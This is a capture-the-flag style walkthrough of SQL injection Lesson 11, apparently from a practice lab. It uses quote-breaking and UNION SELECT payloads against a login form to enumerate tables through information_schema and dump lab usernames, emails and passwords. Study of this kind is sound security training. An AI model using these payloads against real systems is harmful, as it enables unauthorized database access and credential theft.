# Lesson-11

Error Based

When we try just `\` we get

```ABAP
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''\' and password='' LIMIT 0,1' at line 1
```

So the query must be like

```sql
SELECT * FROM users where username=''$username' AND password='$password' LIMIT 0,1;
```

So we have to use `'` to break the query

When we use

```sql
1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database(); #
```

We get an error

```ABAP
The used SELECT statements have a different number of columns
```

So we use:

```sql
1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database(); #

Your Password:emails,referers,uagents,users
```

So we try to get all the info from the tables using

First we get the column names

```ABAP
1' union select 1,group_concat(column_name) from information_schema.columns where table_name='emails'; #

Your Password:id,email_id
```

2

```ABAP
1' union select 1,group_concat(column_name) from information_schema.columns where table_name='referers'; #

Your Password:id,referer,ip_address
```

3

```ABAP
1' union select 1,group_concat(column_name) from information_schema.columns where table_name='uagents'; #

Your Password:id,uagent,ip_address,username
```

4

```ABAP
1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'; #

Your Password:id,username,password
```

Now we can get all the data from these tables

From emails

```ABAP
1' union select group_concat(id),group_concat(email_id) from emails; #

Your Login name:1,2,3,4,5,6,7,8
Your Password:Dumb@dhakkan.com,Angel@iloveu.com,Dummy@dhakkan.local,secure@dhakkan.local,stupid@dhakkan.local,superman@dhakkan.local,batman@dhakkan.local,admin@dhakkan.com
```

From referers :

```ABAP
1' union select group_concat(id),group_concat(ip_address) from referers; #

Your Login name:
Your Password:

!empty!
```

From uagents :

```ABAP
1' union select group_concat(id),group_concat(uagent) from uagents; #

Your Login name:1,2,3,4,5,6
Your Password:Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,0,0,0

1' union select group_concat(ip_address),group_concat(username) from uagents; #

Your Login name:172.17.0.1,172.17.0.1,172.17.0.1,172.17.0.1,172.17.0.1,172.17.0.1
Your Password:admin,admin,admin,admin,admin,admin
```

From users:

```ABAP
1' union select group_concat(id),group_concat(username) from users; #

Your Login name:1,2,3,4,5,6,7,8,9,10,11,12,14
Your Password:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4

1' union select group_concat(username),group_concat(password) from users; #

Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
```
